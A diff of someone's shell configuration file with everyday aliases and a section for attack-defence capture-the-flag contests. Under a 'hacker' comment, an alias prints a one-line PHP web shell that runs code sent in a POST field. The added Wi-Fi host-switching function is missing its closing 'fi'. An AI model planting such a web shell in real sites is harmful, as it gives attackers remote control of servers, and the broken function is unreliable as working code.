@@ -16,12 +16,13 @@ alias gitback="git reset . && git checkout . && git clean -df" # git back (to or
 alias cae="conda activate"
 alias cde="conda deactivate"
 alias sizeof="du -sh" 
+alias ipip='echo "public IP addr: $(curl -s http://myip.ipip.net)"'
 # hacker
 alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
 alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"
 # awd
-server="team1@192-168-1-180.pvp695.bugku.cn"
-port=2222
+server="ybw@love4cry.cn"
+port=22222
 alias pass="echo '0e9521b8817afabe993efe5e42b53156' | copy && echo pass_copied."
 function push-keysh(){
   curl -fsSL love4cry.cn/key.sh -o key.sh
@@ -74,16 +75,23 @@ if [[ $UNAME =~ "Darwin" ]]; then
   alias pip3="/opt/homebrew/bin/pip3"
   alias burp="cd ~/Desktop/BurpSuite2020.12 && nohup ./BURP.sh > /dev/null &"
   alias sed="gsed"
+  alias wifi='/System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport'
   function host_cpu(){
     # set host for `cpu`(my windows)
-    host_file="/etc/hosts"
-    line=$(cat -n $host_file| grep -w cpu | awk -F" " '{print $1}')
-    sudo gsed -i "$line c\\$1 cpu" $host_file 
+    sudo sed "s/.*cpu/$1 cpu/g"  -i /etc/hosts
+  }
+  function update_host_cpu(){
+    wifi_name=$(wifi -I| awk -F: '/ SSID/{print $2}' | sed 's/^[ \t]*//g')
+    echo "current wifi to $wifi_name"
+    if    [ $wifi_name == "Neri" ];       then host_cpu 192.168.2.249;
+    elif  [ $wifi_name == "Redmi K30" ];  then host_cpu 192.168.43.113;
+    else  host_cpu 47.110.233.7;
   }
   function push-wsl(){
     scp $1 ybw@cpu:~/pwn/target
     scp $1 ybw@cpu:/mnt/c/Users/27564/Desktop/pwnfiles
   }
+  update_host_cpu
 elif [[ $UNAME =~ "WSL2" ]]; then
   __conda="$HOME/.miniconda"
   user="/mnt/c/Users/27564"
@@ -96,7 +104,7 @@ elif [[ $UNAME =~ "WSL2" ]]; then
   function pfd2win(){
     # port forward to windows
     netsh.exe interface portproxy reset
-    netsh.exe interface portproxy add v4tov4 listenaddress=$win_ip listenport=22 connectaddress=wsl.local connectport=22
+    netsh.exe interface portproxy add v4tov4 listenaddress=$win_ip listenport=22222 connectaddress=wsl.local connectport=22
     netsh.exe interface portproxy add v4tov4 listenaddress=$win_ip listenport=23946 connectaddress=wsl.local connectport=23946
   }
   function wsl_hosts(){
